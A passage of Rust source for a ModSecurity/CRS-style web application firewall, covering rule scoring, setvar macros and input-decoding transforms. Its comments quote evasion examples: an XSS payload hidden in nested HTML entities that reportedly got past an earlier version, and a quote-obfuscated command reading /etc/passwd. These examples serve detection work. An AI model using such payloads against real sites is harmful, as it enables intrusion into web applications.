    matched_value: Option<String>,
) {
    let phase = rule_phase_to_phase(meta.phase);

    match &meta.action {
        RuleAction::Block => {
            if ctx.decision != WafDecision::Block {
                ctx.decision = WafDecision::Block;
                ctx.block_reason = Some(meta.message.clone());
            }
        }
        RuleAction::Allow => {
            ctx.decision = WafDecision::Allow;
        }
        RuleAction::Challenge(_) => {
            if ctx.decision == WafDecision::Allow {
                ctx.decision = WafDecision::Challenge;
                ctx.block_reason = Some(meta.message.clone());
            }
        }
        RuleAction::Score | RuleAction::Log => {
            // No decision change; just accumulate score
        }
        RuleAction::Redirect(_) | RuleAction::PluginCall { .. } => {
            // TODO: implement in later phases
        }
    }

    // Add anomaly score — to the total of the side the RULE says it scores. A
    // CRS response rule declares `tx.outbound_anomaly_score_plN` and scores the
    // RESPONSE, judged against the outbound threshold; it must never raise the
    // request's score. Every other rule — including an operator's own SRL
    // `response_body` rule — adds to the request total and is judged against
    // the site's threshold, as it was before outbound scoring existed. Keying
    // this on the phase instead turned such a rule scoring 4 or more into a
    // standalone block at the outbound threshold. (Code review finding.)
    if meta.score_delta > 0 {
        if scores_outbound(meta) {
            ctx.outbound_anomaly_score = ctx
                .outbound_anomaly_score
                .saturating_add(meta.score_delta as u32);
        } else {
            ctx.anomaly_score = ctx.anomaly_score.saturating_add(meta.score_delta as u32);
        }
    }

    // Apply setvar mutations to the per-request TX store. Runs whenever the rule
    // fires — including "silent" score-gate rules below — so category scores
    // (tx.sql_injection_score, …) and correlation state accumulate for later
    // rules to read via `TX:` targets.
    for sv in &meta.setvars {
        apply_setvar(ctx, sv);
    }

    // Only record in rule_matches when the rule has observable effect.
    // CRS paranoia-level skip-gates (pass, no score, no message) are silent.
    let is_silent = meta.message.is_empty()
        && meta.score_delta <= 0
        && matches!(meta.action, RuleAction::Score | RuleAction::Log);

    if !is_silent {
        ctx.rule_matches.push(RuleMatch {
            rule_id: meta.id.to_string(),
            message: meta.message.clone(),
            severity: map_severity(meta.severity),
            score: meta.score_delta.max(0) as u32,
            target: matched_target.unwrap_or_default(),
            phase,
            matched_value: matched_value.unwrap_or_default(),
        });
    }

    debug!(
        rule_id = meta.id,
        message = %meta.message,
        score_delta = meta.score_delta,
        "rule fired"
    );
}

// ---------------------------------------------------------------------------
// setvar — per-request TX variable mutation
// ---------------------------------------------------------------------------

/// Apply one `setvar` mutation to the per-request TX store (`ctx.tx_vars`).
///
/// `Add`/`Sub` treat the current value and the (macro-expanded) operand as
/// integers, defaulting a missing/non-numeric value to 0 — matching CRS
/// category-score accumulation. `Set` stores the macro-expanded string as-is.
fn apply_setvar(ctx: &mut RequestContext, sv: &SetVar) {
    match &sv.op {
        SetVarOp::Unset => {
            ctx.tx_vars.remove(&sv.name);
        }
        SetVarOp::Set(val) => {
            let expanded = expand_tx_macros(val, ctx);
            ctx.tx_vars.insert(sv.name.clone(), expanded);
        }
        SetVarOp::Add(expr) => {
            let delta = expand_tx_macros(expr, ctx)
                .trim()
                .parse::<i64>()
                .unwrap_or(0);
            let cur = tx_var_i64(ctx, &sv.name);
            ctx.tx_vars
                .insert(sv.name.clone(), cur.saturating_add(delta).to_string());
        }
        SetVarOp::Sub(expr) => {
            let delta = expand_tx_macros(expr, ctx)
                .trim()
                .parse::<i64>()
                .unwrap_or(0);
            let cur = tx_var_i64(ctx, &sv.name);
            ctx.tx_vars
                .insert(sv.name.clone(), cur.saturating_sub(delta).to_string());
        }
    }
}

/// Read a TX variable as an integer, treating missing/non-numeric as 0.
fn tx_var_i64(ctx: &RequestContext, name: &str) -> i64 {
    ctx.tx_vars
        .get(name)
        .and_then(|v| v.trim().parse::<i64>().ok())
        .unwrap_or(0)
}

/// Expand `%{...}` macros in a setvar value against the current TX store and the
/// CRS numeric constants. A macro that resolves to nothing expands to an empty
/// string (which is treated as 0 in the numeric `Add`/`Sub` context). UTF-8 safe.
fn expand_tx_macros(input: &str, ctx: &RequestContext) -> String {
    if !input.contains("%{") {
        return input.to_owned();
    }
    let mut out = String::with_capacity(input.len());
    let mut rest = input;
    while let Some(start) = rest.find("%{") {
        out.push_str(&rest[..start]);
        let after = &rest[start + 2..];
        match after.find('}') {
            Some(end) => {
                out.push_str(&resolve_macro(&after[..end], ctx));
                rest = &after[end + 1..];
            }
            None => {
                // Unterminated `%{` — emit the literal remainder verbatim.
                out.push_str(&rest[start..]);
                return out;
            }
        }
    }
    out.push_str(rest);
    out
}

/// Resolve a single macro body such as `tx.critical_anomaly_score`. Only `tx.*`
/// references (and their CRS numeric-constant fallbacks) are modelled; any other
/// collection resolves to an empty string.
fn resolve_macro(inner: &str, ctx: &RequestContext) -> String {
    let lower = inner.trim().to_ascii_lowercase();
    match lower.strip_prefix("tx.") {
        Some(var) => {
            let key = var.to_ascii_uppercase();
            ctx.tx_vars
                .get(&key)
                .cloned()
                .or_else(|| crs_constant(&key).map(str::to_owned))
                .unwrap_or_default()
        }
        None => String::new(),
    }
}

/// Expand `%{...}` macros in an OPERATOR pattern, returning `None` if any of
/// them cannot be resolved to a non-empty value.
///
/// Deliberately stricter than [`expand_tx_macros`], which is for `setvar` values
/// and resolves the unknown to `""`. An empty expansion is harmless in a setvar
/// and catastrophic in an operator: CRS has rules of the form
/// `REQUEST_METHOD "!@within %{tx.allowed_methods}"`, and an empty allow-list
/// means every method is "not within" it — i.e. deny every request. Returning
/// `None` lets the VM push `Absent`, which `Not` keeps false.
fn expand_operator_macros(raw: &str, ctx: &RequestContext) -> Option<String> {
    let mut out = String::with_capacity(raw.len());
    let mut rest = raw;
    while let Some(start) = rest.find("%{") {
        out.push_str(&rest[..start]);
        let after = &rest[start + 2..];
        let end = after.find('}')?; // unterminated macro — refuse to guess
        out.push_str(&resolve_operator_macro(&after[..end], ctx)?);
        rest = &after[end + 1..];
    }
    out.push_str(rest);
    Some(out)
}

/// Resolve one macro body for an operator pattern. `None` means "not available",
/// which is different from "empty" — see [`expand_operator_macros`].
fn resolve_operator_macro(inner: &str, ctx: &RequestContext) -> Option<String> {
    let lower = inner.trim().to_ascii_lowercase();
    // `tx.NAME`, including the numeric capture slots `tx.1`..`tx.9`.
    if let Some(var) = lower.strip_prefix("tx.") {
        let key = var.to_ascii_uppercase();
        let v = ctx
            .tx_vars
            .get(&key)
            .cloned()
            .or_else(|| crs_constant(&key).map(str::to_owned))?;
        return (!v.is_empty()).then_some(v);
    }
    // `request_headers.NAME` — used by the RFI and session-fixation rules to
    // compare a candidate host against the request's own Host.
    if let Some(name) = lower.strip_prefix("request_headers.") {
        let v = ctx.request_headers.get(name)?.to_str().ok()?.to_owned();
        return (!v.is_empty()).then_some(v);
    }
    None
}

/// CRS numeric constants normally seeded by `crs-setup.conf`. Referenced by
/// category-score setvars like `setvar:tx.sql_injection_score=+%{tx.critical_anomaly_score}`.
fn crs_constant(key_upper: &str) -> Option<&'static str> {
    match key_upper {
        "CRITICAL_ANOMALY_SCORE" => Some("5"),
        "ERROR_ANOMALY_SCORE" => Some("4"),
        "WARNING_ANOMALY_SCORE" => Some("3"),
        "NOTICE_ANOMALY_SCORE" => Some("2"),
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// Transform helpers
// ---------------------------------------------------------------------------

/// Apply all transforms in declaration order (strictly chained output → input).
fn apply_transforms(mut s: String, transforms: &[Transform]) -> String {
    for t in transforms {
        s = apply_single_transform(s, t);
    }
    s
}

/// Apply `f` repeatedly (up to `max` passes) until the output stops changing —
/// unwraps multi-layer encoding (double/triple URL-encoding `%253C` -> `%3C` ->
/// `<`, nested HTML entities) that single-pass decoding misses. Used only for
/// decoders that are idempotent once fully decoded, so benign text stabilises
/// after one pass and is left unchanged. NOT used for base64/hex, where a second
/// pass can spuriously "decode" already-plaintext into garbage.
fn to_fixpoint(s: String, max: usize, f: impl Fn(String) -> String) -> String {
    let mut cur = s;
    for _ in 0..max {
        let next = f(cur.clone());
        if next == cur {
            break;
        }
        cur = next;
    }
    cur
}

/// Apply a single transform step.  Used both by `apply_transforms` and by
/// the multiMatch loop in the VM.
fn apply_single_transform(s: String, t: &Transform) -> String {
    match t {
        Transform::Lowercase => s.to_ascii_lowercase(),
        // Recursive: defeats double/triple URL-encoding evasion (%253Cscript).
        Transform::UrlDecodeUni => to_fixpoint(s, 3, |x| url_decode_uni(&x)),
        Transform::RemoveNulls => s.replace('\0', ""),
        Transform::ReplaceNulls => s.replace('\0', " "),
        // Recursive: defeats nested HTML-entity encoding (&amp;#60; -> &#60; -> <).
        Transform::HtmlEntityDecode => to_fixpoint(s, 3, decode_html_entities),
        Transform::RemoveWhitespace => s.chars().filter(|c| !c.is_ascii_whitespace()).collect(),
        Transform::CompressWhitespace => compress_whitespace(s),
        Transform::JsDecode => decode_js_escapes(s),
        Transform::CssDecode => decode_css_escapes(s),
        Transform::Base64Decode => base64_decode_transform(&s),
        Transform::HexDecode => hex_decode_transform(&s),
        Transform::NormalisePath => normalise_path_transform(s.replace('\\', "/")),
        Transform::NormalisePathWin => normalise_path_transform(s.replace('\\', "/")),
        Transform::Trim => s.trim().to_owned(),
        Transform::TrimLeft => s.trim_start().to_owned(),
        Transform::TrimRight => s.trim_end().to_owned(),
        // UTF-8 to Unicode — replace non-ASCII bytes with \uXXXX (basic ASCII pass-through)
        Transform::Utf8ToUnicode => s
            .chars()
            .flat_map(|c| {
                if c.is_ascii() {
                    vec![c]
                } else {
                    format!("\\u{:04X}", c as u32).chars().collect::<Vec<_>>()
                }
            })
            .collect(),
        // Comment removal — strip /* ... */ style C comments
        Transform::RemoveCommentsChar => remove_comments_char(s),
        Transform::RemoveComments => remove_sql_comments(s),
        Transform::ReplaceComments => replace_sql_comments(s),
        Transform::CmdLine => cmdline_transform(&s),
        Transform::EscapeSeqDecode => escape_seq_decode(s),
        Transform::Length => s.len().to_string(),
    }
}

/// ModSecurity `t:cmdLine` — normalize shell command-line obfuscation so the
/// RCE detection rules can match. Deletes `\ " ' ^`; deletes a space that
/// precedes `/` or `(`; turns `,` and `;` into spaces; collapses runs of
/// whitespace to a single space; lowercases. e.g. `c"a"t /e''tc/passwd` → `cat /etc/passwd`.
fn cmdline_transform(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut prev_space = false;
    for c in s.chars() {
        match c {
            '\\' | '"' | '\'' | '^' => continue, // deleted
            ',' | ';' => {
                if !prev_space {
                    out.push(' ');
                    prev_space = true;
                }
            }
            '/' | '(' => {
                // delete the single space that immediately precedes it
                if prev_space && out.ends_with(' ') {
                    out.pop();
                }
                out.push(c.to_ascii_lowercase());
                prev_space = false;
            }
            c if c.is_ascii_whitespace() => {
                if !prev_space {
                    out.push(' ');
                    prev_space = true;
                }
            }
            c => {
                out.push(c.to_ascii_lowercase());
                prev_space = false;
            }
        }
    }
    out
}

/// ModSecurity `t:escapeSeqDecode` — decode ANSI-C escape sequences: `\xHH`,
/// octal `\NNN` (1–3 digits), and the single-char escapes `\a \b \f \n \r \t
/// \v \\ \? \' \"`. Unknown escapes are passed through unchanged.
fn escape_seq_decode(s: String) -> String {
    if !s.contains('\\') {
        return s;
    }
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match chars.peek().copied() {
            Some('x') | Some('X') => {
                chars.next();
                let mut hex = String::new();
                while hex.len() < 2 && chars.peek().map(|c| c.is_ascii_hexdigit()) == Some(true) {
                    hex.push(chars.next().unwrap());
                }
                match u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
                    Some(ch) if !hex.is_empty() => out.push(ch),
                    _ => {
                        out.push('\\');
                        out.push('x');
                        out.push_str(&hex);
                    }
                }
            }
            Some(d) if ('0'..='7').contains(&d) => {
                let mut oct = String::new();
                while oct.len() < 3 && chars.peek().map(|c| ('0'..='7').contains(c)) == Some(true) {
                    oct.push(chars.next().unwrap());
                }
                match u32::from_str_radix(&oct, 8).ok().and_then(char::from_u32) {
                    Some(ch) => out.push(ch),
                    None => {
                        out.push('\\');
                        out.push_str(&oct);
                    }
                }
            }
            Some(esc) => {
                chars.next();
                let decoded = match esc {
                    'a' => Some('\u{07}'),
                    'b' => Some('\u{08}'),
                    'f' => Some('\u{0C}'),
                    'n' => Some('\n'),
                    'r' => Some('\r'),
                    't' => Some('\t'),
                    'v' => Some('\u{0B}'),
                    '\\' => Some('\\'),
                    '?' => Some('?'),
                    '\'' => Some('\''),
                    '"' => Some('"'),
                    _ => None,
                };
                match decoded {
                    Some(ch) => out.push(ch),
                    None => {
                        out.push('\\');
                        out.push(esc);
                    }
                }
            }
            None => out.push('\\'),
        }
    }
    out
}

/// Decode HTML entities like ModSecurity's `t:htmlEntityDecode`: any decimal
/// `&#DDD;` and hex `&#xHH;`/`&#XHH;` numeric entity (trailing `;` optional),
/// plus the common named entities. Previously only a fixed ~13-entry table,
/// which let attackers evade the 39 XSS/SQLi rules that rely on this transform
/// via arbitrary numeric entities (e.g. `&#40;` → `(`, `&#x61;` → `a`).
fn decode_html_entities(s: String) -> String {
    if !s.contains('&') {
        return s;
    }
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] != '&' {
            out.push(chars[i]);
            i += 1;
            continue;
        }
        // Numeric entity: &#DDD; (decimal) or &#xHH; / &#XHH; (hex).
        if i + 2 < chars.len() && chars[i + 1] == '#' {
            let (is_hex, start) = if chars[i + 2] == 'x' || chars[i + 2] == 'X' {
                (true, i + 3)
            } else {
                (false, i + 2)
            };
            let mut j = start;
            while j < chars.len()
                && ((is_hex && chars[j].is_ascii_hexdigit())
                    || (!is_hex && chars[j].is_ascii_digit()))
            {
                j += 1;
            }
            if j > start {
                let num: String = chars[start..j].iter().collect();
                let radix = if is_hex { 16 } else { 10 };
                if let Some(ch) = u32::from_str_radix(&num, radix)
                    .ok()
                    .and_then(char::from_u32)
                {
                    out.push(ch);
                    if j < chars.len() && chars[j] == ';' {
                        j += 1; // consume optional trailing ';'
                    }
                    i = j;
                    continue;
                }
            }
        }
        // Named entities (require the trailing ';').
        // Window must fit the LONGEST name below (&NewLine; is 9). It was 6,
        // which was exactly long enough for the six entities that used to be
        // here and silently too short for anything else.
        let window: String = chars[i..(i + 10).min(chars.len())].iter().collect();
        // HTML5 named entities for ASCII punctuation.
        //
        // This list held six entries — the ones everybody remembers — and that
        // gap was a live XSS bypass, measured by GoTestWAF on 2026-09-15:
        //
        //     &gt; src onerror=confirm&amp;lpar;1&amp;rpar;&lt;
        //
        // reached the application with a 200. A browser resolves `&amp;lpar;`
        // to `&lpar;` and then to `(`, so it reads that as `confirm(1)` and
        // runs it. The decoder stopped at `&lpar;`, every XSS rule downstream
        // saw a string with no parentheses, and nothing fired. The same payload
        // spelled with literal brackets was a 403.
        //
        // So the entities that matter for evasion are the PUNCTUATION ones —
        // the characters that make a payload syntactically executable. They are
        // all here now, ordered longest-first so a prefix match cannot pick a
        // shorter name that happens to start the same way.
        //
        // Decoding more of them is strictly more correct, not more aggressive:
        // it makes the inspected string closer to what the browser will
        // actually execute, which is the whole purpose of the transform.
        let named: &[(&str, char)] = &[
            ("&NewLine;", '\n'),
            ("&percnt;", '%'),
            ("&lowbar;", '_'),
            ("&period;", '.'),
            ("&dollar;", '$'),
            ("&commat;", '@'),
            ("&excl;", '!'),
            ("&quest;", '?'),
            ("&grave;", '`'),
            ("&equals;", '='),
            ("&colon;", ':'),
            ("&comma;", ','),
            ("&nbsp;", ' '),
            ("&quot;", '"'),
            ("&apos;", '\''),
            ("&verbar;", '|'),
            ("&plus;", '+'),
            ("&minus;", '-'),
            ("&lpar;", '('),
            ("&rpar;", ')'),
            ("&lsqb;", '['),
            ("&rsqb;", ']'),
            ("&lcub;", '{'),
            ("&rcub;", '}'),
            ("&bsol;", '\\'),
            ("&sol;", '/'),
            ("&semi;", ';'),
            ("&num;", '#'),
            ("&ast;", '*'),
            ("&Tab;", '\t'),
            ("&amp;", '&'),
            ("&lt;", '<'),
            ("&gt;", '>'),
        ];
        if let Some((ent, ch)) = named.iter().find(|(ent, _)| window.starts_with(ent)) {
            out.push(*ch);
            i += ent.chars().count();
            continue;
        }
        out.push('&');
        i += 1;
    }
    out
}

fn compress_whitespace(s: String) -> String {
    let mut out = String::with_capacity(s.len());
    let mut prev_space = false;
    for c in s.chars() {
        if c.is_ascii_whitespace() {
            if !prev_space {
                out.push(' ');
            }
            prev_space = true;
        } else {
            out.push(c);
            prev_space = false;
        }
    }
    out
}

fn decode_js_escapes(s: String) -> String {
    if !s.contains('\\') {
        return s;
    }
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match chars.peek().copied() {
            Some('u') => {
                chars.next();
                let hex: String = chars.by_ref().take(4).collect();
                if hex.len() == 4 {
                    if let Ok(n) = u32::from_str_radix(&hex, 16) {
                        if let Some(ch) = char::from_u32(n) {
                            out.push(ch);
                            continue;
                        }
                    }
                }
                out.push('\\');
                out.push('u');
                out.push_str(&hex);
            }
            Some('x') => {
                chars.next();
                let hex: String = chars.by_ref().take(2).collect();
                if hex.len() == 2 {
                    if let Ok(n) = u32::from_str_radix(&hex, 16) {
                        if let Some(ch) = char::from_u32(n) {
                            out.push(ch);
                            continue;
                        }
                    }
                }
                out.push('\\');
                out.push('x');
                out.push_str(&hex);
            }
            Some('n') => {
                chars.next();
                out.push('\n');
            }
            Some('r') => {
                chars.next();
                out.push('\r');
            }
            Some('t') => {
                chars.next();
                out.push('\t');
            }
            Some('\\') => {
                chars.next();
                out.push('\\');
            }
            _ => out.push('\\'),
        }
    }
    out
}

/// Decode CSS hex escape sequences: `\NNNNNN` (1-6 hex digits) optionally
/// followed by a single whitespace character or semicolon.
///
/// Examples: `\0041` → `A`, `\26 ` → `&`, `\000026;` → `&`.
fn decode_css_escapes(s: String) -> String {
    if !s.contains('\\') {
        return s;
    }
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        // Collect up to 6 hex digits.
        let mut hex = String::new();
        while hex.len() < 6 {
            match chars.peek() {
                Some(&h) if h.is_ascii_hexdigit() => {
                    hex.push(h);
                    chars.next();
                }
                _ => break,
            }
        }
        if hex.is_empty() {
            // Not a hex escape — treat backslash literally.
            out.push('\\');
            continue;
        }
        // Consume optional trailing whitespace/semicolon (one char only).
        match chars.peek() {
            Some(&' ') | Some(&'\t') | Some(&'\n') | Some(&'\r') | Some(&'\x0C') | Some(&';') => {
                chars.next();
            }
            _ => {}
        }
        if let Ok(n) = u32::from_str_radix(&hex, 16) {
            if let Some(ch) = char::from_u32(n) {
                out.push(ch);
                continue;
            }
        }
        // Invalid codepoint — emit the escape literally.
        out.push('\\');
        out.push_str(&hex);
    }
    out
}

// ---------------------------------------------------------------------------
// New transform helpers (base64, hex, path normalisation, comment removal)
// ---------------------------------------------------------------------------

/// Decode standard base64 (MIME alphabet, with and without `=` padding).
/// Strips whitespace first (headers often have line breaks).
/// Returns the original string unchanged on any decoding error.
fn base64_decode_transform(s: &str) -> String {
    // Strip whitespace first (headers often have line breaks).
    let cleaned: String = s.chars().filter(|c| !c.is_ascii_whitespace()).collect();
    if cleaned.len() < 8 {
        return s.to_owned();
    }
    // First pass: try to decode the cleaned string as pure Base64.
    if let Some(decoded) = try_decode_base64(&cleaned) {
        if let Ok(result) = String::from_utf8(decoded) {
            return result;
        }
    }
    // Second pass: handle URLPath case where the value starts with '/'
    // (e.g. "/DQpRVUlUDQo"). The '/' is a valid Base64 character, so the
    // first pass decodes it as part of the payload and produces garbage.
    // Stripping the leading '/' exposes the real Base64 payload.
    if let Some(stripped) = cleaned.strip_prefix('/') {
        if !stripped.is_empty() {
            if let Some(decoded) = try_decode_base64(stripped) {
                if let Ok(result) = String::from_utf8(decoded) {
                    return result;
                }
            }
        }
    }
    s.to_owned()
}

/// Try to decode a Base64 string (with auto-padding for unpadded input).
/// Returns None if the string contains non-Base64 characters.
fn try_decode_base64(input: &str) -> Option<Vec<u8>> {
    let mut padded = input.to_owned();
    let rem = padded.len() % 4;
    if rem != 0 {
        for _ in 0..(4 - rem) {
            padded.push('=');
        }
    }
    let bytes = padded.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len() * 3 / 4);
    let mut i = 0;
    while i + 3 < bytes.len() {
        let b0 = decode_b64_byte(bytes[i])?;
        let b1 = decode_b64_byte(bytes[i + 1])?;
        let b2 = decode_b64_byte(bytes[i + 2])?;
        let b3 = decode_b64_byte(bytes[i + 3])?;
        out.push((b0 << 2) | (b1 >> 4));
        if bytes[i + 2] != b'=' {
            out.push((b1 << 4) | (b2 >> 2));
        }
        if bytes[i + 3] != b'=' {
            out.push((b2 << 6) | b3);
        }
        i += 4;
    }
    Some(out)
}

fn decode_b64_byte(c: u8) -> Option<u8> {
    match c {
        b'A'..=b'Z' => Some(c - b'A'),
        b'a'..=b'z' => Some(c - b'a' + 26),
        b'0'..=b'9' => Some(c - b'0' + 52),
        b'+' => Some(62),
        b'/' => Some(63),
        b'=' => Some(0),
        _ => None,
    }
}

/// Decode a hex-encoded string (optional `0x`/`0X` prefix; even-length hex bytes).
/// Returns original on error or invalid input.
fn hex_decode_transform(s: &str) -> String {
    let hex = s
        .strip_prefix("0x")
        .or_else(|| s.strip_prefix("0X"))
        .unwrap_or(s)
        .trim();
    if hex.is_empty() || hex.len() % 2 != 0 || !hex.chars().all(|c| c.is_ascii_hexdigit()) {
        return s.to_owned();
    }
    let bytes: Option<Vec<u8>> = (0..hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).ok())
        .collect();
    bytes
        .and_then(|b| String::from_utf8(b).ok())
        .unwrap_or_else(|| s.to_owned())
}

/// Collapse `..` and `.` path segments; deduplicate adjacent slashes.
fn normalise_path_transform(s: String) -> String {
    if !s.contains("..") && !s.contains("//") && !s.contains("./") {
        return s;
    }
    let leading = s.starts_with('/');
    let mut parts: Vec<&str> = Vec::new();
    for seg in s.split('/') {
        match seg {
            "" | "." => {}
            ".." => {
                parts.pop();
            }
            other => parts.push(other),
        }
    }
    let mut out = parts.join("/");
    if leading {
        out.insert(0, '/');
    }
    out
}

/// Strip C-style comment characters (`/*` and `*/`) from input.
fn remove_comments_char(s: String) -> String {
    s.replace("/*", "").replace("*/", "").replace("//", "")
}

/// Remove SQL/C block comments (`/* ... */`) from input.
fn remove_sql_comments(mut s: String) -> String {
    while let Some(start) = s.find("/*") {
        let end = match s[start + 2..].find("*/") {
            Some(i) => start + 2 + i + 2,
            None => break,
        };
        s = format!("{}{}", &s[..start], &s[end..]);
    }
    s
}

/// Replace SQL/C block comments with a single space.
fn replace_sql_comments(mut s: String) -> String {
    while let Some(start) = s.find("/*") {
        let end = match s[start + 2..].find("*/") {
            Some(i) => start + 2 + i + 2,
            None => break,
        };
        s = format!("{} {}", &s[..start], &s[end..]);
    }
    s
}

// ---------------------------------------------------------------------------
// Stack helpers
// ---------------------------------------------------------------------------

fn pop_strings(stack: &mut Vec<StackVal>) -> Rc<Vec<String>> {
    match stack.pop() {
        Some(StackVal::Strings(v)) => v,
        Some(other) => {
            warn!("VM: expected Strings on stack, got {:?}", other);
            Rc::default()
        }
        None => {
            warn!("VM: stack underflow on pop_strings");
            Rc::default()
        }
    }
}

fn pop_bool(stack: &mut Vec<StackVal>) -> bool {
    match stack.pop() {
        Some(StackVal::Bool(b)) => b,
        Some(StackVal::Absent) => false,
        Some(other) => {
            warn!("VM: expected Bool on stack, got {:?}", other);
            false
        }
        None => {
            warn!("VM: stack underflow on pop_bool");
            false
        }
    }
}

fn pop_numeric_f64(stack: &mut Vec<StackVal>) -> f64 {
    match stack.pop() {
        Some(StackVal::Int(v)) => v as f64,
        Some(StackVal::Float(v)) => v as f64,
        // TX variables are stored as strings; parse numerically when compared.
        // This makes @lt / @ge work against TX:DETECTION_PARANOIA_LEVEL etc.
        Some(StackVal::Strings(v)) => v.first().and_then(|s| s.parse::<f64>().ok()).unwrap_or(0.0),
        Some(other) => {
            warn!("VM: expected numeric on stack, got {:?}", other);
            0.0
        }
        None => {
            warn!("VM: stack underflow on pop_numeric");
            0.0
        }
    }
}

// ---------------------------------------------------------------------------
// Match location — which parameter held the matched text (for logging only)
// ---------------------------------------------------------------------------

/// The named values of one request, labelled the way a ModSecurity exclusion
/// names them (`ARGS:q`, `REQUEST_COOKIES:lang`, `REQUEST_HEADERS:x-api-version`).
///
/// A RuleMatch records the COLLECTION a rule read (`ARGS`), or nothing when the
/// rule read several (`ARGS|REQUEST_HEADERS|…` — every 99001xx all-placement
/// signature). Either way the event never named the parameter, which is the one
/// thing an operator needs to judge a false positive or scope an exclusion. F5
/// and BunkerWeb both show it.
///
/// Built once per LOGGED request, by the logger, from the same parsers the VM
/// uses — never on the evaluation path, so detection cost is unchanged.
pub struct RequestValues {
    entries: Vec<(Collection, String, String)>,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Collection {
    ArgsGet,
    ArgsPost,
    ArgsNames,
    Cookies,
    Headers,
    Filename,
    Body,
}

impl RequestValues {
    /// Parse the request only if some match can use it: one whose target is not
    /// already exact and that captured text to look for. The logger calls this
    /// for every logged record — on a site reached by IP address that is every
    /// request (920350 on the Host header, already exact) — and re-parsing a
    /// large JSON body there would be pure waste.
    pub fn for_matches(ctx: &RequestContext) -> Self {
        let useful = ctx
            .rule_matches
            .iter()
            .any(|m| !m.target.contains(':') && !m.matched_value.is_empty());
        if useful {
            Self::from_ctx(ctx)
        } else {
            Self {
                entries: Vec::new(),
            }
        }
    }

    pub fn from_ctx(ctx: &RequestContext) -> Self {
        // Its own views, built here once: the logger runs after `evaluate`,
        // whose views are gone by then. Same parsers, so the values listed are
        // the values the rules read.
        let views = RequestViews::default();
        let mut entries = Vec::new();
        for (k, v) in views.query(ctx) {
            entries.push((Collection::ArgsNames, format!("ARGS_NAMES:{k}"), k.clone()));
            entries.push((Collection::ArgsGet, format!("ARGS:{k}"), v.clone()));
        }
        let body = views.body(ctx);
        let body_parsed = !body.is_empty();
        for (k, v) in body {
            if !k.is_empty() {
                entries.push((Collection::ArgsNames, format!("ARGS_NAMES:{k}"), k.clone()));
            }
            let label = if k.is_empty() {
                "REQUEST_BODY".to_string()
            } else {
                format!("ARGS:{k}")
            };
            entries.push((Collection::ArgsPost, label, v.clone()));
        }
        for (k, v) in views.cookies(ctx) {
            entries.push((
                Collection::Cookies,
                format!("REQUEST_COOKIES:{k}"),
                v.clone(),
            ));
        }
        for (name, value) in ctx.request_headers.iter() {
            if let Ok(v) = value.to_str() {
                entries.push((
                    Collection::Headers,
                    format!("REQUEST_HEADERS:{}", name.as_str()),
                    v.to_owned(),
                ));
            }
        }
        entries.push((
            Collection::Filename,
            "REQUEST_FILENAME".to_string(),
            percent_decode(ctx.uri.path()),
        ));
        // The raw body only when no parser claimed it: a parsed body is already
        // listed field by field, and listing it twice would make every body
        // match "ambiguous".
        if !body_parsed {
            if let Some(b) = ctx.request_body.as_ref() {
                entries.push((
                    Collection::Body,
                    "REQUEST_BODY".to_string(),
                    String::from_utf8_lossy(b).into_owned(),
                ));
            }
        }
        Self { entries }
    }

    /// Name the one place `matched` sits, within what `rule_target` says the
    /// rule read — or `None` when that is not certain.
    ///
    /// Certainty is the whole contract: naming the wrong parameter sends an
    /// operator to write an exclusion against a field that never fired. So a
    /// label is returned only when EXACTLY ONE location contains the text:
    /// - `rule_target` a specific member (`REQUEST_HEADERS:User-Agent`) is
    ///   already exact and is returned unchanged;
    /// - a collection (`ARGS`, `REQUEST_COOKIES`, …) is refined within it;
    /// - empty (the rule read several collections) searches all of them, minus
    ///   `Cookie` and `Referer`, which only repeat values listed elsewhere.
    ///
    /// The comparison is case-insensitive over collapsed whitespace, because
    /// the matched text is post-transform (lowercased, decoded) while the listed
    /// values are as parsed.
    pub fn locate(&self, rule_target: &str, matched: &str) -> Option<String> {
        if rule_target.contains(':') {
            return Some(rule_target.to_string());
        }
        let needle = normalize_for_locate(matched);
        if needle.is_empty() || needle.starts_with("[redacted") {
            return None;
        }
        let allowed: &[Collection] = match rule_target {
            "" => &[
                Collection::ArgsGet,
                Collection::ArgsPost,
                Collection::Cookies,
                Collection::Headers,
                Collection::Filename,
                Collection::Body,
            ],
            "ARGS" => &[Collection::ArgsGet, Collection::ArgsPost],
            "ARGS_GET" | "QUERY_STRING" => &[Collection::ArgsGet],
            "ARGS_NAMES" | "ARGS_GET_NAMES" => &[Collection::ArgsNames],
            "REQUEST_COOKIES" => &[Collection::Cookies],
            "REQUEST_HEADERS" => &[Collection::Headers],
            "REQUEST_FILENAME" => return Some(rule_target.to_string()),
            _ => return None,
        };
        let multi = rule_target.is_empty();
        let mut found: Option<&str> = None;
        for (coll, label, value) in &self.entries {
            if !allowed.contains(coll) {
                continue;
            }
            if multi
                && *coll == Collection::Headers
                && (label == "REQUEST_HEADERS:cookie" || label == "REQUEST_HEADERS:referer")
            {
                continue;
            }
            if normalize_for_locate(value).contains(&needle) {
                match found {
                    None => found = Some(label.as_str()),
                    Some(prev) if prev == label.as_str() => {}
                    Some(_) => return None, // two places — not certain
                }
            }
        }
        found.map(str::to_string)
    }
}

fn normalize_for_locate(s: &str) -> String {
    s.split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .to_lowercase()
}

#[cfg(test)]
mod locate_tests {
    use super::*;
    use std::net::{IpAddr, Ipv4Addr};

    fn ctx(uri: &str) -> RequestContext {
        let mut c = RequestContext::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 1);
        c.uri = uri.parse().unwrap();
        c
    }

    #[test]
    fn names_the_query_parameter_a_multi_target_rule_matched() {
